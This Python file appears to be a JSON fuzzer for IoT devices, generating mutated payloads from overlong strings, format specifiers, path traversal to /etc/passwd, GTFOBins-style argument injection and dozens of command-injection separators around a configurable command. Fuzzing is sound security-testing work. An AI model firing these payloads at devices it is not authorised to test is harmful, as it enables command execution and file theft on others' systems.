'''
IoT Mutator by re.about
'''
import logging
from config import DEFAULT_WRITE_FILE,FILTER_LIST,DEFAULT_COMMAND
import random
from lib.tree import *
from inspect import isfunction




class BasicMutator:

    @staticmethod
    def get_string(mode="",ci=False):
        string_mutator_simple =[
                "",
                "A"*10000,
                "\r\n" * 1000,
                "<>" * 500,# sendmail crackaddr (http://lsd-pl.net/other/sendmail.txt)
                # format strings.
                "%n" * 5000,
                '"%n"' * 5000,
                "%s" * 5000,
                '"%s"' * 5000,
                # 路径穿越
                "/.../.../.../.../.../.../.../.../.../.../",
                "/../../../../../../../../../../../../etc/passwd",
                "/../../../../../../../../../../../../boot.ini",
                "/../../../../../../../../../../../.." + DEFAULT_WRITE_FILE
        ]

        string_mutator =[
                #https://github.com/jtpereyda/boofuzz/blob/master/boofuzz/primitives/string.py
                # strings ripped from spike (and some others I added)
                "/.:/" + "A" * 5000 + "\x00\x00",
                "/.../" + "B" * 5000 + "\x00\x00",
                "..:..:..:..:..:..:..:..:..:..:..:..:..:",
                "\\\\*",
                "\\\\?\\",
                "/\\" * 5000,
                "/." * 5000,
                "!@#$%%^#$%#$@#$%$$@#$%^^**(()",
                "%01%02%03%04%0a%0d%0aADSF",
                "%01%02%03@%04%0a%0d%0aADSF",
                "\x01\x02\x03\x04",
                "/%00/",
                "%00/",
                "%00",
                "%u0000",
                "%\xfe\xf0%\x00\xff",
                "%\xfe\xf0%\x01\xff" * 20,
        ]
        string_mutator += string_mutator_simple

        #https://gtfobins.github.io/
        parameter_injection_mutator =[
            " . -o ! -name . -exec "+DEFAULT_COMMAND+" \; ",  #find(必触发)
            " --exec='!"+DEFAULT_COMMAND+"' ", #mail
            " -x sh -c 'reset; exec "+DEFAULT_COMMAND+" 1>&0 2>&0' ",#watch
            " -e 'os.execute(\""+DEFAULT_COMMAND+"\")' ",# lua 
            " -s --eval=$'x:\n\t-'\""+DEFAULT_COMMAND+"\" ", # make
            " "+DEFAULT_COMMAND+" ",	#nohup,busybox,env
            " -r 'system("+DEFAULT_COMMAND+");' ",	#php
            " -u / "+DEFAULT_COMMAND,	#flock
            " 'BEGIN {system(\""+DEFAULT_COMMAND+"\")}' ",	#awk,gawk,mawk
            " -e '/bin/sh -c "+DEFAULT_COMMAND+" rdoc ",	#gem open
            " -e \"exec('/bin/sh -c "+DEFAULT_COMMAND+"')\" ",	#jrunscript
            " --dev null --script-security 2 --up '/bin/sh -c "+DEFAULT_COMMAND+"' ",	#openvpn
            " -e 'exec \"/bin/sh -c "+DEFAULT_COMMAND+"\";' ",	#perl
            " -c 'import os; os.system(\"/bin/sh -c "+DEFAULT_COMMAND+"\")' ",	#python
            " -p '`/bin/sh -c "+DEFAULT_COMMAND+" 1>&0`' ",	#rake
            " -e '/bin/sh -c "+DEFAULT_COMMAND+"' 127.0.0.1:/dev/null ",	#rsync
            " -e 'exec \"/bin/sh -c "+DEFAULT_COMMAND+"\"' ",	#ruby
            " -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec='"+DEFAULT_COMMAND+"' ",	#tar
            " -a /dev/null "+DEFAULT_COMMAND+" ",	#xargs
            " -n '1e exec "+DEFAULT_COMMAND+"' /etc/hosts ",	#sed
        ]

        command_injection_mutator_simple =[
            # command injection.
            "|"+DEFAULT_COMMAND+"",
            "$("+DEFAULT_COMMAND+")",
            "`"+DEFAULT_COMMAND+"`",
            ";"+DEFAULT_COMMAND+";",
            "\n"+DEFAULT_COMMAND+"\n",
            "%0d%0a"+DEFAULT_COMMAND+";",
            "%0a "+DEFAULT_COMMAND+" %0a",
            "';"+DEFAULT_COMMAND+"'",
            "'$("+DEFAULT_COMMAND+")'",
        ]
        command_injection_mutator_simple += parameter_injection_mutator
        command_injection_mutator =[
            #https://github.com/jtpereyda/boofuzz/blob/master/boofuzz/primitives/string.py#L93
            # fuzzdb command injection
            "a)|"+DEFAULT_COMMAND+";",
            "CMD=$'"+DEFAULT_COMMAND+"';$CMD",
            "a;"+DEFAULT_COMMAND+"",
            "a)|"+DEFAULT_COMMAND+"",
            "|"+DEFAULT_COMMAND+";",
            "'"+DEFAULT_COMMAND+"'",
            '^CMD=$"'+DEFAULT_COMMAND+';$CMD',
            "%0DCMD=$'"+DEFAULT_COMMAND+"';$CMD",
            "/index.html|"+DEFAULT_COMMAND+"|",
            "|"+DEFAULT_COMMAND+"|",
            "||"+DEFAULT_COMMAND+";",
            ";"+DEFAULT_COMMAND+"/n",
            "a;"+DEFAULT_COMMAND+"|",
            "&"+DEFAULT_COMMAND+"&",
            "%0A"+DEFAULT_COMMAND+"",
            "a);"+DEFAULT_COMMAND+"",
            "$;"+DEFAULT_COMMAND+"",
            '&CMD=$"'+DEFAULT_COMMAND+';$CMD',
            '&&CMD=$'+DEFAULT_COMMAND+';$CMD',
            ";"+DEFAULT_COMMAND+"",
            ";"+DEFAULT_COMMAND+";",
            "&CMD=$'"+DEFAULT_COMMAND+"';$CMD",
            "& "+DEFAULT_COMMAND+" &",
            "; "+DEFAULT_COMMAND+"",
            "&&CMD=$'"+DEFAULT_COMMAND+"';$CMD",
            ""+DEFAULT_COMMAND+"",
            "^CMD=$'"+DEFAULT_COMMAND+"';$CMD",
            ";CMD=$'"+DEFAULT_COMMAND+"';$CMD",
            "|"+DEFAULT_COMMAND+"",
            "<"+DEFAULT_COMMAND+";",
            "FAIL||"+DEFAULT_COMMAND+"",
            "a);"+DEFAULT_COMMAND+"|",
            '%0DCMD=$'+DEFAULT_COMMAND+';$CMD',
            ""+DEFAULT_COMMAND+"|",
            "%0A"+DEFAULT_COMMAND+"%0A",
            "a;"+DEFAULT_COMMAND+";",
            'CMD=$"'+DEFAULT_COMMAND+';$CMD',
            "&&"+DEFAULT_COMMAND+"",
            "||"+DEFAULT_COMMAND+"|",
            "&&"+DEFAULT_COMMAND+"&&",
            "^"+DEFAULT_COMMAND+"",
            ";|"+DEFAULT_COMMAND+"|",
            "|CMD=$'"+DEFAULT_COMMAND+"';$CMD",
            "&"+DEFAULT_COMMAND+"",
            "a|"+DEFAULT_COMMAND+"",
            "<"+DEFAULT_COMMAND+"%0A",
            'FAIL||CMD=$"'+DEFAULT_COMMAND+';$CMD',
            "<"+DEFAULT_COMMAND+"%0D",
            ";"+DEFAULT_COMMAND+"|",
            "%0D"+DEFAULT_COMMAND+"",
            "%0A"+DEFAULT_COMMAND+"%0A",
            "%0D"+DEFAULT_COMMAND+"%0D",
            ";system('"+DEFAULT_COMMAND+"')",
            '|CMD=$"'+DEFAULT_COMMAND+'";$CMD',
            ';CMD=$"'+DEFAULT_COMMAND+'";$CMD',
            "<"+DEFAULT_COMMAND+"",
            "a);"+DEFAULT_COMMAND+";",
            "& "+DEFAULT_COMMAND+"",
            "| "+DEFAULT_COMMAND+"",
            "FAIL||CMD=$'"+DEFAULT_COMMAND+"';$CMD",
            '<!--#exec cmd="'+DEFAULT_COMMAND+'"-->',
            ""+DEFAULT_COMMAND+";",
        ]
        command_injection_mutator+=command_injection_mutator_simple

        if ci :
            if mode=="simple":
                return command_injection_mutator_simple
            return  command_injection_mutator
        else:
            if mode=="simple":
                return string_mutator_simple + command_injection_mutator_simple
            return  string_mutator + command_injection_mutator

    @staticmethod
    def get_int():
        int_mutator = [
            lambda x: 0,
            #https://github.com/mseclab/PyJFuzz/blob/master/pyjfuzz/core/pjf_mutators.py#L65
            lambda x: x ^ 0xffffff,
            lambda x: -x,
            lambda x: "%s" % x,
            lambda x: x | 0xff,
            lambda x: random.randint(-2147483647, 2147483647),
            lambda x: bool(x),
            lambda x: x | 0xff000000
        ]
        return int_mutator
    @staticmethod
    def get_boolean():
        boolean_mutator = [
            lambda x: not x,
            lambda x: str(x),
            lambda x: str(not x),
            lambda x: int(x),
            lambda x: int(not x),
            lambda x: float(x),
            lambda x: float(not x),
        ]
        return boolean_mutator
    @staticmethod
    def get_float():
        float_mutator = [
            lambda x: float(int(round(x, 0)) ^ 0xffffff),
            lambda x: -x,
            lambda x: "%s" % x,
            lambda x: float(int(round(x, 0)) | 0xff),
            lambda x: float(random.randint(-2147483647, 2147483647)*0.1),
            lambda x: bool(round(x, 0)),
            lambda x: float(int(round(x, 0)) | 0xff000000)
        ]
        return float_mutator

class JsonMutator:
    def __init__(self,mode="default"):
        if mode=="default" or mode=="simple":
            self.string_mutator = BasicMutator.get_string(mode)
            self.int_mutator = BasicMutator.get_int()
            self.boolean_mutator = BasicMutator.get_boolean()
            self.float_mutator = BasicMutator.get_float()
            self.list_mutator =[
                lambda x: list( x+['AAA' for i in range(1,10000) ] ),
                #lambda x: list( x+['A'*10000] ),
                lambda x: list( x+[['AAA' for i in range(1,10000)]] ),
                lambda x: list( x+[ i for i in self.string_mutator ]),

            ]


        self.mutator = {
            str: self.string_mutator,
            int: self.int_mutator,
            float: self.float_mutator,
            list:self.list_mutator,
            bool: self.boolean_mutator,
            type(None):self.string_mutator,
        }

    def get_payload(self,data):
        return self.mutator[type(data)]

    def get_paylaod_list(self,data):
        data_json = json.loads(data)
        json_tree = dict2tree(data_json)
        tmp_mutation_list =[]
        #添加个null情况
        tmp_mutation_list.append("")
        #yield ""
        def callback(leaf,tree):
            #白名单
            if leaf.data[0] not in FILTER_LIST:
                former = leaf.data
                mutation_list =  self.get_payload(leaf.data[1])
                for mu in  mutation_list:
                    test = type(leaf.data[1])
                    if type(leaf.data[1]) == str and mu !="":
                        leaf.data = (leaf.data[0], leaf.data[1] + mu) 
                    elif type(leaf.data[1]) == str:
                        leaf.data = (leaf.data[0],"")
                    elif leaf.data[1]==None:
                        leaf.data = (leaf.data[0],mu)
                    elif isfunction(mu):
                        leaf.data = (leaf.data[0], mu(leaf.data[1]))
                    else:
                        leaf.data = (leaf.data[0], mu)
                    tmp_dict = tree2dict(tree)
                    a = type(tmp_dict)
                    payload = json.dumps(tmp_dict)
                    tmp_mutation_list.append(payload)
                    #yield payload
                    leaf.data = former     
        
        traverse(json_tree, json_tree, callback)
        return tmp_mutation_list
        

